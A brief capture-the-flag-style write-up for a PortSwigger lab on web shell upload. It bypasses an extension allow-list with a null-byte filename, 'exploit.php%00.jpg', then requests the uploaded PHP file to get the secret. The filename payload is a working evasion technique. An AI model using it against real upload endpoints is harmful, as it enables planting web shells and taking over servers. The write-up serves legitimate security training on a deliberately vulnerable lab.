# Lab 04 — Web shell upload via obfuscated file extension

> **Practitioner** · [Official lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

**Entry point:** the extension allow-list (JPG/PNG) — but the server
truncates at a null byte.

## Solution

1. Upload `exploit.php` → rejected.
2. Replay with the filename:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
```

The validation sees `.jpg`; the filesystem receives `exploit.php` (the
response even calls it that).
3. `GET /files/avatars/exploit.php` — secret returned — lab solved.

## Notes

Null-byte truncation: legacy but still appears in custom validators.
